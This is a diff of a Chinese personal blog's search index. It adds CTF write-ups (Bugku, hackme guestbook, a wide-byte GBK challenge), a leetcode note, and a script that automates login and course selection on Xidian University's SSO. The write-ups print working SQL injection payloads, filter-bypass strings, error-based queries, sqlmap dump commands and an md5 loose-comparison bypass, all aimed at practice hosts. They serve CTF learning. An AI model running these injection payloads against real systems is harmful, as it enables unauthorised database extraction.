@@ -1,6 +1,149 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Bugku</title>
+    <url>/2020/08/08/Bugku/</url>
+    <content><![CDATA[<h1 id="Bugku刷题"><a href="#Bugku刷题" class="headerlink" title="Bugku刷题"></a>Bugku刷题</h1><span id="more"></span>
+
+<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><pre><code class="hljs html">1&#x27; and 1=1 #      
+  
+1&#x27; and 1=2 #</code></pre>
+<p>   不显示内容，可以判断存在注入点</p>
+<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4#可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4</code>#可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><pre><code>` -1&apos; union select 1,database(),3,4 #`
+
+     database:skctf_flag</code></pre><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre><p> table:fl4g,sc</p>
+<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre><p> skctf_flag</p>
+<p> 得到flag</p>
+<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中</strong></p>
+<p><img src="/2020/08/08/Bugku/cjd1.png" alt></p>
+<h3 id="1-获取数据库"><a href="#1-获取数据库" class="headerlink" title="1.获取数据库"></a>1.获取数据库</h3><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre><p><img src="/2020/08/08/Bugku/cjd2.png" alt></p>
+<h3 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre><p><img src="/2020/08/08/Bugku/cjd3.png" alt></p>
+<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre><p><img src="/2020/08/08/Bugku/cjd4.png" alt></p>
+<h3 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre><p><img src="/2020/08/08/Bugku/cjd5.png" alt></p>
+<hr>
+<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p> 扫描发现了index.php，通过  index.php.bak下载网页源码</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * Created by PhpStorm.</span>
+<span class="hljs-comment"> * User: Norse</span>
+<span class="hljs-comment"> * Date: 2017/8/6</span>
+<span class="hljs-comment"> * Time: 20:22</span>
+<span class="hljs-comment">*/</span>
+
+<span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;
+ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = strstr(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], <span class="hljs-string">&#x27;?&#x27;</span>);
+<span class="hljs-variable">$str</span> = substr(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);
+<span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>);
+parse_str(<span class="hljs-variable">$str</span>);
+<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key1</span>);
+
+<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key2</span>);
+<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$key1</span>) == md5(<span class="hljs-variable">$key2</span>) &amp;&amp; <span class="hljs-variable">$key1</span> !== <span class="hljs-variable">$key2</span>)&#123;
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;取得flag&quot;</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+
+<p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
+<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
+<p> 2.利用==比较漏洞</p>
+<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
+<p> 下列的字符串的MD5值都是0e开头的：</p>
+<pre><code>QNKCDZO
+
+240610708
+
+s878926199a
+
+s155964671a
+
+s214587387a
+
+s214587387a</code></pre><hr>
+<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>爆数据库名</p>
+<p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
+<p>database:<strong>web1002-1</strong></p>
+<p>爆表名</p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre><p>flag1,hint</p>
+<p>爆字段名</p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre><p>flag1,address<br>获取内容</p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre><p><strong>usOwycTju+FTUUzXosjr</strong></p>
+<p>提交发现不对</p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre><p>获取address中的内容</p>
+<p>./Once_More.php<br>下一关地址<br>得到另外一个地址</p>
+<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre><p>给出提示<br>XPATH syntax error: ‘<del>class,flag2</del>‘</p>
+<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre><p>Unknown column ‘flag2’ in ‘where clause’</p>
+<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre><p>XPATH syntax error: ‘<del>flag{Bugku-sql_6s-2i-4t-bug}</del>‘</p>
+<p><strong>！！！注意把flag改为小写字母</strong></p>
+<hr>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>靶场：<a href="靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
+<h3 id="一、手工注入"><a href="#一、手工注入" class="headerlink" title="一、手工注入"></a>一、手工注入</h3><p>第一步</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre><p>加单引号报错</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre><p>查看所有的表</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre><p>查看表中的列</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
+ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
+<p>获取字段内容</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
+<h3 id="二、sqlmap注入"><a href="#二、sqlmap注入" class="headerlink" title="二、sqlmap注入"></a>二、sqlmap注入</h3><p>检测是否有注入点</p>
+<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>没有成功<br>使用十六进制</p>
+<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre><p>获取数据库名</p>
+<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
+ --dbs //选择十六进制 获取数据库名 单引号使用url编码</code></pre><p>获取表名</p>
+<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre><p>获取flag</p>
+<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre><p><img src="/2020/08/08/Bugku/k1.png" alt></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Daily_Algorithm</title>
+    <url>/2022/07/29/Daily-Algorithm/</url>
+    <content><![CDATA[<h1 id="每日刷题"><a href="#每日刷题" class="headerlink" title="每日刷题"></a>每日刷题</h1><p>leetcode每日刷题，先定个小目标300</p>
+<p><a href="https://github.com/sunzhengyu99/Daily-Algorithm">项目地址</a></p>
+]]></content>
+      <tags>
+        <tag>java,algorithm</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>guestbook</title>
+    <url>/2020/04/18/Guestbook/</url>
+    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new">guestbook</a></h1><span id="more"></span>
+<p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
+<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackme.inndy.tw<span class="hljs-regexp">/gb/</span>?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">20</span><span class="hljs-comment">#</span>
+<span class="hljs-regexp">//i</span>d=-<span class="hljs-number">1</span> 是让前面的内容不显示</code></pre>
+<p>3被回显</p>
+<p>1.查看数据库名</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%<span class="hljs-number">20</span>#</code></pre>
+
+<p>数据库的名字<code>g8</code></p>
+<p>2.查看表名</p>
+<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
+<p>发现有一个表 <code>flag</code></p>
+<p>3.测试表的字段</p>
+<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
+<p>仍然显示<code>flag</code></p>
+<p>4.读取flag   </p>
+<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select flag from flag limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
+
+<p>得到flag!</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>IDscan</title>
     <url>/2021/07/28/IDscan/</url>
     <content><![CDATA[<p>一个针对URL的简单敏感信息扫描器</p>
@@ -279,137 +422,201 @@ http:<span class="hljs-regexp">//</span>www.baidu.com:<span class="hljs-number">
       </tags>
   </entry>
   <entry>
-    <title>Bugku</title>
-    <url>/2020/08/08/Bugku/</url>
-    <content><![CDATA[<h1 id="Bugku刷题"><a href="#Bugku刷题" class="headerlink" title="Bugku刷题"></a>Bugku刷题</h1><span id="more"></span>
-
-<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><pre><code class="hljs html">1&#x27; and 1=1 #      
-  
-1&#x27; and 1=2 #</code></pre>
-<p>   不显示内容，可以判断存在注入点</p>
-<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4#可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4</code>#可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><pre><code>` -1&apos; union select 1,database(),3,4 #`
-
-     database:skctf_flag</code></pre><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre><p> table:fl4g,sc</p>
-<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre><p> skctf_flag</p>
-<p> 得到flag</p>
-<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
-<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中</strong></p>
-<p><img src="/2020/08/08/Bugku/cjd1.png" alt></p>
-<h3 id="1-获取数据库"><a href="#1-获取数据库" class="headerlink" title="1.获取数据库"></a>1.获取数据库</h3><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre><p><img src="/2020/08/08/Bugku/cjd2.png" alt></p>
-<h3 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre><p><img src="/2020/08/08/Bugku/cjd3.png" alt></p>
-<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre><p><img src="/2020/08/08/Bugku/cjd4.png" alt></p>
-<h3 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre><p><img src="/2020/08/08/Bugku/cjd5.png" alt></p>
-<hr>
-<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p> 扫描发现了index.php，通过  index.php.bak下载网页源码</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-comment">/**</span>
-<span class="hljs-comment"> * Created by PhpStorm.</span>
-<span class="hljs-comment"> * User: Norse</span>
-<span class="hljs-comment"> * Date: 2017/8/6</span>
-<span class="hljs-comment"> * Time: 20:22</span>
-<span class="hljs-comment">*/</span>
-
-<span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;
-ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
-<span class="hljs-variable">$str</span> = strstr(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], <span class="hljs-string">&#x27;?&#x27;</span>);
-<span class="hljs-variable">$str</span> = substr(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);
-<span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>);
-parse_str(<span class="hljs-variable">$str</span>);
-<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key1</span>);
-
-<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key2</span>);
-<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$key1</span>) == md5(<span class="hljs-variable">$key2</span>) &amp;&amp; <span class="hljs-variable">$key1</span> !== <span class="hljs-variable">$key2</span>)&#123;
-<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;取得flag&quot;</span>;
+    <title>XDU_choose_course</title>
+    <url>/2022/09/09/XDU-choose-course/</url>
+    <content><![CDATA[<h1 id="XDU-抢课脚本"><a href="#XDU-抢课脚本" class="headerlink" title="XDU 抢课脚本"></a>XDU 抢课脚本</h1><p><a href="https://github.com/sunzhengyu99/DailyClock_XDU_version">项目地址</a></p>
+<h2 id="1-登录认证"><a href="#1-登录认证" class="headerlink" title="1.登录认证"></a>1.登录认证</h2><h2 id="1-1-密码加密"><a href="#1-1-密码加密" class="headerlink" title="1.1 密码加密"></a>1.1 密码加密</h2><p>首先在浏览器中在同一身份的位置进行手动登录可以发现如下的请求</p>
+<ul>
+<li>输入的密码已经被加密</li>
+<li>表单参数中多了一个execution参数</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220909130442.png" alt="image-20220909095403214"></p>
+<p>在浏览器拦截的请求中有一个<code>encrypt.js</code>的文件，猜测是用于加密密码的</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909095645965.png" alt="image-20220909095645965"></p>
+<p>该文件的代码很长，但是核心的加密过程如下</p>
+<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAesString</span>(<span class="hljs-params">data, key0, iv0</span>) </span>&#123;
+  key0 = key0.replace(<span class="hljs-regexp">/(^\s+)|(\s+$)/g</span>, <span class="hljs-string">&quot;&quot;</span>);
+  <span class="hljs-keyword">var</span> key = CryptoJS.enc.Utf8.parse(key0);
+  <span class="hljs-keyword">var</span> iv = CryptoJS.enc.Utf8.parse(iv0);
+  <span class="hljs-keyword">var</span> encrypted = CryptoJS.AES.encrypt(data, key, &#123;
+    iv: iv,
+    mode: CryptoJS.mode.CBC,
+    padding: CryptoJS.pad.Pkcs7
+  &#125;);
+  <span class="hljs-keyword">return</span> encrypted.toString();
 &#125;
-<span class="hljs-meta">?&gt;</span></code></pre>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encryptAES</span>(<span class="hljs-params">data, aesKey</span>) </span>&#123;
+  <span class="hljs-keyword">if</span> (!aesKey) &#123;
+    <span class="hljs-keyword">return</span> data;
+  &#125;
+  <span class="hljs-keyword">var</span> encrypted = getAesString(
+    randomString(<span class="hljs-number">64</span>) + data,
+    aesKey,
+    randomString(<span class="hljs-number">16</span>)
+  );
+  <span class="hljs-keyword">return</span> encrypted;
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encryptPassword</span>(<span class="hljs-params">pwd0, key</span>) </span>&#123;
+  <span class="hljs-keyword">try</span> &#123;
+    <span class="hljs-keyword">return</span> encryptAES(pwd0, key);
+  &#125; <span class="hljs-keyword">catch</span> (e) &#123;&#125;
+  <span class="hljs-keyword">return</span> pwd0;
+&#125;
+<span class="hljs-keyword">var</span> $aes_chars = <span class="hljs-string">&quot;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&quot;</span>;
+<span class="hljs-keyword">var</span> aes_chars_len = $aes_chars.length;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randomString</span>(<span class="hljs-params">len</span>) </span>&#123;
+  <span class="hljs-keyword">var</span> retStr = <span class="hljs-string">&quot;&quot;</span>;
+  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;
+    retStr += $aes_chars.charAt(<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * aes_chars_len));
+  &#125;
+  <span class="hljs-keyword">return</span> retStr;
+&#125;</code></pre>
+
+<p>可以看出使用的时AES的CBC模式进行加密，而AES在加密时需要一个密钥，这个密钥应该是隐藏在前端页面中，每次刷新都会更新。</p>
+<p>果然在前端页面中可以找到<code>pwdEncryptSalt</code>字段，并把<code>execution</code>字段也找了出来</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909100329173.png" alt="image-20220909100329173"></p>
+<p>下面就是写出AES加密的脚本(fe1w0写的)</p>
+<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encryptPassword</span>(<span class="hljs-params">password, key</span>):</span>
+    <span class="hljs-comment"># password 加密, 该段代码参考于 https://github.com/EdenLin-c/CPdaily/blob/master/Jin.py</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randomString</span>(<span class="hljs-params"><span class="hljs-built_in">len</span></span>):</span>
+        retStr = <span class="hljs-string">&#x27;&#x27;</span>
+        i=<span class="hljs-number">0</span>
+        <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>:
+            retStr += aes_chars[(math.floor(random.random() * aes_chars_len))]
+            i=i+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">return</span> retStr
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getAesString</span>(<span class="hljs-params">data,key,iv</span>):</span>
+        key = re.sub(<span class="hljs-string">&#x27;/(^\s+)|(\s+$)/g&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, key)
+        aes = AES.new(<span class="hljs-built_in">str</span>.encode(key),AES.MODE_CBC,<span class="hljs-built_in">str</span>.encode(iv))
+        pad_pkcs7 = pad(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size, style=<span class="hljs-string">&#x27;pkcs7&#x27;</span>)
+        encrypted =aes.encrypt(pad_pkcs7)
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(base64.b64encode(encrypted),<span class="hljs-string">&#x27;utf-8&#x27;</span>)
+    aes_chars = <span class="hljs-string">&#x27;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&#x27;</span>
+    aes_chars_len = <span class="hljs-built_in">len</span>(aes_chars)
+    encrypted = getAesString(randomString(<span class="hljs-number">64</span>) + password, key, randomString(<span class="hljs-number">16</span>))
+    <span class="hljs-keyword">return</span> encrypted
+</code></pre>
+
+<h2 id="1-2-获取session"><a href="#1-2-获取session" class="headerlink" title="1.2 获取session"></a>1.2 获取session</h2><p>下面就是使用requese获取登录的session</p>
+<p>设置请求头</p>
+<pre><code class="hljs python">headers = &#123;
+    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#x27;</span>,
+    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,
+    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,
+    <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;max-age=0&#x27;</span>,
+    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;keep-alive&#x27;</span>,
+    <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;154&#x27;</span>,
+    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,
+    <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;ids.xidian.edu.cn&#x27;</span>,
+    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;http://ids.xidian.edu.cn&#x27;</span>,
+    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://ids.xidian.edu.cn/authserver/login&#x27;</span>,
+    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,
+    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36&#x27;</span>,
+&#125;</code></pre>
+
+<p>获取前端页面的<code>pwdEncryptSalt</code>字段和<code>execution</code>字段，并对密码进行加密</p>
+<pre><code class="hljs python">session_client = requests.Session()
+requests.packages.urllib3.disable_warnings()
+response = session_client.get(<span class="hljs-string">&quot;https://ids.xidian.edu.cn/authserver/login&quot;</span>)
+
+parse_html = etree.HTML(response.text)
+pwdEncryptSalt = parse_html.xpath(<span class="hljs-string">&#x27;//div//input[@id=&quot;pwdEncryptSalt&quot;]//@value&#x27;</span>)[<span class="hljs-number">0</span>]
+execution = parse_html.xpath(<span class="hljs-string">&#x27;//div//input[@id=&quot;execution&quot;]//@value&#x27;</span>)[<span class="hljs-number">0</span>]
+encrypt_passwrod = encryptPassword(password, pwdEncryptSalt)</code></pre>
+
+<p>设置post请求参数</p>
+<pre><code class="hljs python">post_data = &#123;
+<span class="hljs-string">&quot;username&quot;</span>: user_id,
+<span class="hljs-string">&quot;password&quot;</span>: encrypt_passwrod,
+<span class="hljs-string">&quot;captcha&quot;</span>: <span class="hljs-literal">None</span>,
+<span class="hljs-string">&quot;_eventId&quot;</span>: <span class="hljs-string">&quot;submit&quot;</span>,
+<span class="hljs-string">&quot;cllt&quot;</span>: <span class="hljs-string">&quot;userNameLogin&quot;</span>,
+<span class="hljs-string">&quot;dllt&quot;</span>: <span class="hljs-string">&quot;generalLogin&quot;</span>,
+<span class="hljs-string">&quot;lt&quot;</span>: <span class="hljs-literal">None</span>,
+<span class="hljs-string">&quot;execution&quot;</span>: execution
+&#125;
+sso_response = session_client.post(<span class="hljs-string">&quot;https://ids.xidian.edu.cn/authserver/login&quot;</span>, headers=headers, data=post_data,verify=<span class="hljs-literal">False</span>)</code></pre>
+
+<h2 id="2-获取课程列表"><a href="#2-获取课程列表" class="headerlink" title="2.获取课程列表"></a>2.获取课程列表</h2><p>进入选课平台后，能够看到<code>https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/loadJhnCourseInfo.do</code>这样一条请求，查看数可知，是加载计划内选课的api</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909101535786.png" alt="image-20220909101535786"></p>
+<p>再仔细看拦截的请求，可以看到很多请求参数</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909101655048.png" alt="image-20220909101655048"></p>
+<p>第一个就是查询关键字参数，即将想抢课的课程代码或课程名放到此处即可获取到相应的课程信息。</p>
